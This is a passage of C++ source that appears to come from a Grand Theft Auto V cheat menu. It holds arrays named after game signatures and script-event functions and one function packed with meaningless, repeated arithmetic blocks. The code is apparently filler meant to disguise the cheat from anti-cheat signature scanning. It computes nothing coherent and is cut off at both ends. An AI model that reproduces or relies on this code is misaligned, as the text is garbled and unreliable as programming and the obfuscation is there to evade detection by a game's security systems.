			int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			void GravarFloat(float value, std::string app, std::string key)
			{
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
